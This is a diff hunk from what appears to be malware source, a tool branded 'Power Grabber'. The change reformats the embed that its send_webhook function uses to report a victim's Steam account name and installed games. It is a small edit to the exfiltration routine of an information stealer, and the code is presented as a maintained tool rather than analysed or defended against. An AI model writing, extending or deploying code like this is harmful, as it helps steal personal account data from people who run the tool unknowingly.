@@ -65,7 +65,7 @@ def send_webhook(account_name, games):
         "embeds": [
             {
                 "title": "Steam Account Info",
-                "description": f"**Steam Account Name:** {account_name}\n\n**Installed Games:**\n" + "\n".join(games),
+                "description": f"# Steam Account Name:\n{account_name}\n\n# Installed Games:\n" + "\n".join(games),
                 "color": 0x8b0000,
                 "footer": {
                     "text": "Power Grabber | Made by Powercascade and Taktikal.exe"
